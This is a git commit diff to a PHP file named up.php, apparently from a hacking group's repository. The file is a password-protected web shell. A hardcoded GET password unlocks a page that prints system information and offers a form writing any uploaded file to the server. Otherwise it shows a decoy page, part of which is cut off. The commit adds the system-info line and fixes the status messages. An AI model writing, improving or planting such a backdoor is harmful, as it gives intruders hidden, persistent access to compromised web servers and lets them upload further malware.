980821dd769330c39e80d76bd8e8ddd05cf09b5f
Nyx_FallagaTn <29281498+NyxFallagaTn@users.noreply.github.com>
2022-12-03 18:45:37 +0000

    Update up.php

--- up.php
+++ up.php
@@ -1,13 +1,14 @@
 <?php 
 error_reporting(E_ERROR | E_PARSE);
 if ($_GET["pass"] == "nyxfallagatn"){
-echo "Nyx_FallagaTn";
+echo "<b>Nyx_FallagaTeam</b><br>";
+echo '<b>System Info:</b> '.php_uname();
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
-echo '<b>Uploaded Successfully!</b><br><br>'; 
-}else { echo 'Uploaded Successfully!</b><br><br>'; }}
+echo '<b>Success!</b><br><br>'; 
+}else { echo 'Failed!</b><br><br>'; }}
 }else{
 $domain = $_SERVER['SERVER_NAME'];
 echo'<html><head>
